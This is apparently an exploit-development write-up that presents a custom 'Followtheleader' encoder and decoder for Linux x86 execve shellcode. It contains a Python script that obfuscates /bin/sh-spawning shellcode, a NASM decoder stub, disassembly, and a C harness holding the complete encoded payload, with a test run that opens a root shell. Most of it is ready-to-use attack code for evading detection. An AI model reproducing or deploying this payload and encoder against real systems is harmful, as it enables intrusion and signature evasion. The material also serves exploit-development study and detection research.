/*
Followtheleader custom execve-shellcode Encoder/Decoder  - Linux Intel/x86
Author: Konstantinos Alexiou
*/
------------------------------------------------------------------------------------------------------------------
a)Python script. Encoder for shellcode (execve)
------------------------------------------------------------------------------------------------------------------

#!/usr/bin/python
# Author:Konstantinos Alexiou
# Encoding name: Followtheleader-encoder
# Description: Custom execve-shellcode encoder based on a given byte which is used to encode the execve shellcode
import random
import sys
shellcode =('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')

total = len(sys.argv)
if total != 2:
	print '!!Give the LEADER byte'
	print 'Script must run as: python xxx.py LEADER'
	print 'LEADER is any integer between 17-255'
	print 'e.g  python Followtheleader.py 32'
else:
    try:
	leader = int(sys.argv[1])
	fb = int(hex(leader)[2:3],16)		                          # Split the LEADER. If leader = AF -->fb=A
	sb = int(hex(leader)[3:],16)				          # Split the LEADER. If LEADER = AF -->sb=F
	encoded = ' '
	encoded2 = ' '
	encoded = '\\x'
	encoded += hex(leader)[2:]     	    	        		  # FIRST byte the LEADER
	encoded2 = '0x'
	encoded2 += hex(leader)[2:]
	i=0
	for x in bytearray(shellcode):          	                  # READ every Instruction as BYTE
		i +=1
		hopcode = '%02x' %x		             	          # KEEP only the HEX value of opcode
		Dec_hopcode = int(hopcode, 16)		      	          # CALCULATE the DECIMAL value of opcode
		suplX = 255 - Dec_hopcode       		          # CALCULATE the SUPPLEMENT
		rev_suplx = hex(suplX)[::-1]                              # REVERT the bytes of SUPPLEMENT (ae --> ea)
		subfs = fb-sb
#----------------------------The Encoded byte ----------------------------------------------------
   		xxx = hex(int(abs(subfs)) + int(rev_suplx[0:2],16))
#-------------------------------------------------------------------------------------------------
		if len(xxx)>4:				 	          # Check if xxx > 0xff
			print 'Overflow encoding.Try again!!!.'
			sys.exit()
		elif xxx == '0x0':					  # Check if ZERO byte was encoded
	    		print 'A byte was Encoded as 0x00 .Try again!!!'
            		sys.exit()
		encoded +=  '\\x'           			          # Put \x first
		encoded +=  xxx[2:]         			          # Put the xxx afterwards
		insertByte = hex(random.randint(1,255))    	          # Put a Random byte
		encoded += '\\x'
		encoded += insertByte[2:]
		i +=1
		encoded2 += ','
		encoded2 += xxx
		encoded2 += ','
		encoded2 += '0x'
		encoded2 += insertByte[2:]
	print ' *************';
	print ' LEADER BYTE :decimal(%d), HEX(0x%x)'  %(int(sys.argv[1]),leader)
	print ' *************';
	print 'Len of Shellcode: %02d' % i
	print '------------------------------------------------------------------------';
	print '   1. Style:= %s ' % encoded
	print '------------------------------------------------------------------------';
	print '   2. Style:= %s ' % encoded2
	print '------------------------------------------------------------------------';
    except:
	print "exiting..."
---------------------------------------------------------------------------------------


Followtheleader Encoder test run :

$ python Followtheleader-encoder.py 67
 *************
 LEADER BYTE :decimal(67), HEX(0x43)
 *************
Len of Shellcode: 50
------------------------------------------------------------------------
   1. Style:= \x43\xed\x1d\xf4\x40\xfb\x6f\x7a\xa9\xe\xb6\xe\xbc\xc9\xe3\x7a\xaf\x7a\x78
\xe\xc5\xda\x76\x6a\x17\x1a\x4e\x68\x38\xc2\x99\xfb\x35\x68\x84\xd2\xb3\xcb\x7c\x68\x78
\xe2\x9a\xf5\xe9\x50\xc0\x24\x91\xf8\xfe
------------------------------------------------------------------------
   2. Style:= 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,
0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,
0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe
------------------------------------------------------------------------


b) Decoder for the encoded shellcode (execve-stack)
---------------------------------------------------------------------------------------
$ cat Followtheleader-decoder.nasm
; Filename: Followtheleader-decoder.nasm
; Author:  Konstantinos Alexiou
; Description: Followtheleader custom insertion Encoder, Linux Intel/x86

global _start
section .text

_start:
    jmp short call_shellcode

decoder:
    pop esi             	 ; Address of EncodedShellcode to ESI
    lea edi, [esi]               ; Load effective address of what is contained on EDI
    xor ecx, ecx   		 ; Zero ECX
    mul ecx 			 ; This instruction will cause both EAX and EDX to become zero
    xor ebp, ebp            	 ; Zero the value on EBP
    mov dl, byte [esi]           ; Put the LEADER byte to EDX (DL)

;(firstb - secondb) CALCULATION
    mov al, dl                   ; Copy the LEADER to EAX

    ;firstb extraction of LEADER
    shr dl, 4                    ; Keep only the 4 high bits of LEADER to DL (if Leader=ac then DL=a) [firstb]

    ;secondb extraction of LEADER
    shl eax, 28                  ; shift left 28 bits of EAX which contains the value of Leader on al
    shr eax, 28                  ; shift right 28 of EAX (if EAX=0xc0000000 now EAX=0x0000000c) [secondb]
    sub dl, al                   ; (firstb - secondb) value stored to EDX (DL)
    jns decode_pr

negative:			 ; Calculate the absolute value if negative
    not dl
    inc dl

;decode process
decode_pr:

    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx

    mov al, byte [esi+1+ebp]	 ; Put the encoded byte to EAX
    mov ecx, ebp         	 ; EBP is used as a counter copy the value of EBP to ECX
    xor cl, 0x32	         ; At the end of the shellcode EBP should point 50 in decimal 32 in hex
    je short EncodedShellcode

    ;rev_suplx Calculation
    mov cl, al			 ; Put the Encoded byte to EAX (xxx to EAX)
    sub cl, dl          	 ; rev_suplx= xxx-(firstb - secondb) value stored to CL
    mov bl, cl          	 ; Keep Backup of rev_suplx to BL
    mov al, cl          	 ; Second backup of CL

    ;Revert the bytes on rev_suplx
    shr bl, 4                    ; shift 4 bits right (if was bl=ec now bl=e)
    shl eax, 28                  ; shift left 28 bits of EAX which contains the value of rev_supl on cl( if EAX was 0xec now EAX=0xc0000000)
    shr eax, 24                  ; shift right 24 of EAX (if EAX=0xc0000000 now EAX=0x000000c0)
    add eax, ebx                 ; add the value on EBX to EAX (if EAX=0x000000c0 + BL=0xe, EAX=0x0000000ce)

    ;Supplement Calculation
    mov bl, 0xff                 ; Value of  0xff to BL
    sub bl, al                   ; Calculate the Supplement
    mov byte [edi], bl           ; Put the decoded byte to the position of EDI
    inc edi                      ; EDI is a pointer to the position which the decoded bytes will be stored
    add ebp,0x2			 ; The EBP is a counter values will be (2,4,6,..50)

    jmp short decode_pr		 ; Goto the decode process to decode the next bytes

call_shellcode:
    call decoder
    EncodedShellcode: db 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe


---------------------------------------------------------------------------------------------------------------------------------------
$ objdump -d ./Followtheleader-decoder -M intel

./Followtheleader-decoder:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 4e                	jmp    80480b0 <call_shellcode>

08048062 <decoder>:
 8048062:	5e                   	pop    esi
 8048063:	8d 3e                	lea    edi,[esi]
 8048065:	31 c9                	xor    ecx,ecx
 8048067:	f7 e1                	mul    ecx
 8048069:	31 ed                	xor    ebp,ebp
 804806b:	8a 16                	mov    dl,BYTE PTR [esi]
 804806d:	88 d0                	mov    al,dl
 804806f:	c0 ea 04             	shr    dl,0x4
 8048072:	c1 e0 1c             	shl    eax,0x1c
 8048075:	c1 e8 1c             	shr    eax,0x1c
 8048078:	28 c2                	sub    dl,al
 804807a:	79 04                	jns    8048080 <decode_pr>

0804807c <negative>:
 804807c:	f6 d2                	not    dl
 804807e:	fe c2                	inc    dl

08048080 <decode_pr>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	31 db                	xor    ebx,ebx
 8048084:	31 c9                	xor    ecx,ecx
 8048086:	8a 44 2e 01          	mov    al,BYTE PTR [esi+ebp*1+0x1]
 804808a:	89 e9                	mov    ecx,ebp
 804808c:	80 f1 32             	xor    cl,0x32
 804808f:	74 24                	je     80480b5 <EncodedShellcode>
 8048091:	88 c1                	mov    cl,al
 8048093:	28 d1                	sub    cl,dl
 8048095:	88 cb                	mov    bl,cl
 8048097:	88 c8                	mov    al,cl
 8048099:	c0 eb 04             	shr    bl,0x4
 804809c:	c1 e0 1c             	shl    eax,0x1c
 804809f:	c1 e8 18             	shr    eax,0x18
 80480a2:	01 d8                	add    eax,ebx
 80480a4:	b3 ff                	mov    bl,0xff
 80480a6:	28 c3                	sub    bl,al
 80480a8:	88 1f                	mov    BYTE PTR [edi],bl
 80480aa:	47                   	inc    edi
 80480ab:	83 c5 02             	add    ebp,0x2
 80480ae:	eb d0                	jmp    8048080 <decode_pr>

080480b0 <call_shellcode>:
 80480b0:	e8 ad ff ff ff       	call   8048062 <decoder>

080480b5 <EncodedShellcode>:
 80480b5:	43                   	inc    ebx
 80480b6:	ed                   	in     eax,dx
 80480b7:	1d f4 40 fb 6f       	sbb    eax,0x6ffb40f4
 80480bc:	7a a9                	jp     8048067 <decoder+0x5>
 80480be:	0e                   	push   cs
 80480bf:	b6 0e                	mov    dh,0xe
 80480c1:	bc c9 e3 7a af       	mov    esp,0xaf7ae3c9
 80480c6:	7a 78                	jp     8048140 <EncodedShellcode+0x8b>
 80480c8:	0e                   	push   cs
 80480c9:	c5 da 76             	(bad)
 80480cc:	6a 17                	push   0x17
 80480ce:	1a 4e 68             	sbb    cl,BYTE PTR [esi+0x68]
 80480d1:	38 c2                	cmp    dl,al
 80480d3:	99                   	cdq
 80480d4:	fb                   	sti
 80480d5:	35 68 84 d2 b3       	xor    eax,0xb3d28468
 80480da:	cb                   	retf
 80480db:	7c 68                	jl     8048145 <EncodedShellcode+0x90>
 80480dd:	78 e2                	js     80480c1 <EncodedShellcode+0xc>
 80480df:	9a f5 e9 50 c0 24 91 	call   0x9124:0xc050e9f5
 80480e6:	f8                   	clc
 80480e7:	fe                   	.byte 0xfe
-------------------------------------------------------------------------------------------

$ cat shellcode.c
#include<stdio.h>
#include<string.h>
unsigned char code[] =\
"\xeb\x4e\x5e\x8d\x3e\x31\xc9\xf7\xe1\x31\xed\x8a\x16\x88\xd0\xc0\xea\x04\xc1\xe0\x1c\xc1\xe8\x1c\x28\xc2\x79\x04\xf6\xd2\xfe\xc2\x31\xc0\x31\xdb\x31\xc9\x8a\x44\x2e\x01\x89\xe9\x80\xf1\x32\x74\x24\x88\xc1\x28\xd1\x88\xcb\x88\xc8\xc0\xeb\x04\xc1\xe0\x1c\xc1\xe8\x18\x01\xd8\xb3\xff\x28\xc3\x88\x1f\x47\x83\xc5\x02\xeb\xd0\xe8\xad\xff\xff\xff\x43\xed\x1d\xf4\x40\xfb\x6f\x7a\xa9\x0e\xb6\x0e\xbc\xc9\xe3\x7a\xaf\x7a\x78\x0e\xc5\xda\x76\x6a\x17\x1a\x4e\x68\x38\xc2\x99\xfb\x35\x68\x84\xd2\xb3\xcb\x7c\x68\x78\xe2\x9a\xf5\xe9\x50\xc0\x24\x91\xf8\xfe";

main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}
-------------------------------------------------------------------------------------------

$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
$ ./shellcode
Shellcode Length:  136
$whoami
root
$